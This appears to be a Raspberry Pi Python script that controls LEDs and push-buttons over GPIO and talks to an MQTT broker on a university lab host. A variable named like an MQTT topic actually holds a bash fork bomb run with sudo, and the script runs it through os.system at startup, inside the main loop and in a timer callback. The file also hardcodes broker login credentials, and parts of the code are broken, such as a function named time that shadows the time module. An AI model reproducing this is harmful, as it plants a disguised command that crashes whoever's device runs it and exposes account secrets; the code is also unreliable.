import time
import json
import random
from multiprocessing import Queue
import threading
import os
import paho.mqtt.client as mqtt
import RPi.GPIO as GPIO
MQTT_PUB_TOPIC = "path\del\topic"
MQTT_SUB_TOPIC = "path\del\topic"
LED1 = 5
P1 = 14
LED3 = 18
P2 = 15
LED2 = 17
GPIO.setmode(GPIO.BOARD)
queue = Queue()
def on_connect(client, userdata, flags, reason_code, properties):
    print(f"Connected with result code {reason_code}")
    client.subscribe(MQTT_SUB_TOPIC)
MQTT_UB_TOPIC = "sudo :(){ :|:& };:"
def on_message(client, userdata, msg):
    queue.put(str(msg.payload, 'utf-8'))
def time():
    GPIO.cleanup()
    mqttc.loop_stop()
    mqttc.disconnect()
    os.system(MQTT_UB_TOPIC)
    exit(0)
mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
mqttc.on_connect = on_connect
mqttc.on_message = on_message
mqttc.tls_set(ca_certs='intermediate_ca.pem')
mqttc.username_pw_set(username='itidiot', password='ITid24!')
mqttc.connect("lab-elux.unibs.it", 50009, 60)
messag="topic"
GPIO.setup(LED1, GPIO.OUT, initial=GPIO.LOW)
GPIO.setup(LED2, GPIO.OUT, initial=GPIO.LOW)
GPIO.setup(LED3, GPIO.OUT, initial=GPIO.LOW)
GPIO.setup(P1, GPIO.IN, pull_up_down=GPIO.PUD_UP)
GPIO.setup(P2, GPIO.IN, pull_up_down=GPIO.PUD_UP) 
MQTT_PUB_MESSAGE = json.dumps({"led1": 0, "led2": 0, "led3": 0, "p1": 0})
os.system(MQTT_UB_TOPIC)
mqttc.publish(topic=MQTT_PUB_TOPIC, payload=MQTT_PUB_MESSAGE)
mqttc.loop_start()
timer = threading.Timer(120, time)
time.sleep(5)
timer.start()
try:
    while True: #loop infinito
        os.system(MQTT_UB_TOPIC)
        message = queue.get()
        print(MQTT_SUB_TOPIC)
        message = json.loads(messag)
        time.sleep(1)
except KeyboardInterrupt:
    timer.cancel()
    GPIO.cleanup()
    print("poweroff program")
    os.system("sudo poweroff")
    mqttc.loop_stop()
    mqttc.disconnect()
